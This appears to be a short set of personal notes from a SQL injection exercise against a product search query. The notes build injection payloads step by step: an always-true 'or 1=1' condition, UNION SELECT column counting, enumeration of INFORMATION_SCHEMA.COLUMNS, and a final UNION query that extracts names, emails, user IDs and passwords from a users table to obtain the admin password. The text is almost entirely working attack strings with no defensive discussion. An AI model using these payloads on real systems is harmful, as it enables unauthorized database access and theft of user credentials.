

STRING:                | GET ((A% OR %C%) AND C) ORDER BY cateogory
DESIRED STRING: | GET ((A% UNION SELECT * )) --

Possible String: 
SELECT * FROM bproducts WHERE ((pname like 'STH%' or pname LIKE '%STH%') and bu IS NOT NULL) ORDER BY cateogory

SELECT * FROM bproducts WHERE ((pname like ' ' or  1=1)); -- COMMENT
-- 
Test if secret column 7! 
SELECT * FROM bproducts WHERE ((pname like 'a ')) UNION 
SELECT 1,2,3,4,5,6,7; -- COMMENT

Nope. 
-- 
SELECT * FROM bproducts WHERE ((pname like '')) UNION 
SELECT COLUMN_NAME,TABLE_NAME, 3, 4, 5, 6
FROM INFORMATION_SCHEMA.COLUMNS; -- COMMENT 

From ^ found that there is a table bproducts, users
Users: {id, fname, lname, type, userid, email, mobile, city, state, postcode, password}
-- 
!!!
GETTING USER DATA -> admin password 
SELECT * FROM bproducts WHERE ((pname like '')) UNION 
SELECT fname, lname, type, email, userid, password
FROM users; -- COMMENT 
-- 
SELECT * FROM bproducts WHERE ((pname like '')) ORDER by pname; -- COMMENT
 